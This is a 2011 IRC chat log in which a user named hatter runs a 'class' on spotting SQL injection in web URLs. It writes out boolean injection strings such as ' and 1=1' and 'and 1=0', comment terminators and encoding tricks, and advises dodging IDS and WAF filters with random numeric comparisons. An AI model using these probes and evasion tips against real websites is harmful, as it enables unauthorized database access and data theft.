SQL (by hatter)

**** BEGIN LOGGING AT Sat Jun 25 13:07:46 2011

Jun 25 13:07:46 <hatter>    class is now in session.
Jun 25 13:07:49 <Mutiny>    LulzSheep I have 47,655 tracks on my computer ^^
Jun 25 13:08:03 <Mutiny>    Which is about 20k more than I thought XD
Jun 25 13:08:22 >Mutiny<    <hatter> class is now in session.
Jun 25 13:08:22 *    [Mutiny] is away (Sleeping. Gtfo.)
Jun 25 13:08:24 <Fox>    As per usual
Jun 25 13:08:27 <Fox>    If you need voice
Jun 25 13:08:27 <hatter>    For those of you who don’t already know, testing a site via a url is where you append injection strings
Jun 25 13:08:31 <Fox>    ask an op other than the speaker
Jun 25 13:08:34 <Fox>    if you have voice and say something stupid, or troll
Jun 25 13:08:35 <Fox>    get fucked up.
Jun 25 13:08:39 <hatter>    ^
Jun 25 13:08:43 <Fox>    hatter, at your leisure.
Jun 25 13:08:49 <hatter>    Thank you sir
Jun 25 13:09:06 <hatter>    So, the /typical/ injection strings
Jun 25 13:09:07 <hatter>    are
Jun 25 13:09:17 <hatter>    ‘ and 1=1′ and ‘and 1=0′
Jun 25 13:09:28 <hatter>    Followed by some sort of comment notation ( — ; /*)
Jun 25 13:10:03 <hatter>    in a get parameter (e.g. domain.tld/vulnerable.ext?something=29847 and 1=1/*
Jun 25 13:10:06 <hatter>    )
Jun 25 13:10:30 <hatter>    Every once in a while, you may need to close parenthesis and put an extra ) before the comment or two
Jun 25 13:10:52 <hatter>    an IDS will usually notice/a waf will block 1=1 and 1=0
Jun 25 13:10:54 <hatter>    so some random number = itself
Jun 25 13:11:01 <hatter>    and somerandomnumber = someotherrandomnumber
Jun 25 13:11:05 <hatter>    is a better solution.
Jun 25 13:11:37 <hatter>    When you’re testing, you’ll notice (if the site is vulnerable) that the and 1=1 output will be the same as the output without an injection string.
Jun 25 13:12:14 <hatter>    sometimes you’ll want to actually put a quote (%27 urlencoded) before the space
Jun 25 13:12:22 <hatter>    the space is also not always a space when testing or injecting
Jun 25 13:12:46 <hatter>    It could be ‘ ‘ or it could be ‘+’
Jun 25 13:13:19 <hatter>    When you give it the 1=0 injection
Jun 25 13:13:24 <hatter>    you’ll notice a lot of data is missing on the page
Jun 25 13:13:38 <hatter>    that 1=1 is the same as a “true” statement
Jun 25 13:13:48 <hatter>    the 1=0 is the same as a “false” statement.
